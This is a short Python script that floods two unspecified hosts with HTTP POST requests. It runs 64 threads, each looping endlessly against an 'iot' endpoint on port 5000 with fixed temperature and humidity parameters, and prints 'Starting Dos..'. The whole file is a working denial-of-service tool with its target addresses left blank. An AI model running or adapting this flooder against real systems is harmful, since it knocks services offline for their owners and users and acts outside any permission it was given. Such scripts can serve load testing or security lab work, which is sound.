#!/usr/bin/python3

import threading
import requests

host1 = ''
host2 = ''
api = 'iot'


def POST1():
    while True:
        try:
            url = f'''http://{host1}:5000/{api}?temperature=33.0&humidity=33.0'''
            requests.post(url, verify=False)
        except:
            break


def POST2():
    while True:
        try:
            url = f'''http://{host2}:5000/{api}?temperature=33.0&humidity=33.0'''
            requests.post(url, verify=False)
        except:
            break


for _ in range(32):
    post1 = threading.Thread(target=POST1)
    post2 = threading.Thread(target=POST2)
    post1.start()
    post2.start()

print("Starting Dos..")
